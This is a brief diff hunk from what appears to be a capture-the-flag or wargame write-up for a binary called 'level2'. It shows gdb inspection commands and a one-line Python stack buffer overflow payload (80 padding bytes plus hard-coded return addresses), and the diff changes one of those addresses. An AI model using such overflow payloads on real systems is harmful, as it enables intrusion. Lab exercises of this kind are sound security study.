@@ -13,4 +13,4 @@ break main
 run
 x/1024x $ebp
 
-Finally, the epxloit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\xb8\xf7\xff\xbf"' | ./level2
+Finally, the epxloit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\x58\xf8\xff\xbf"' | ./level2
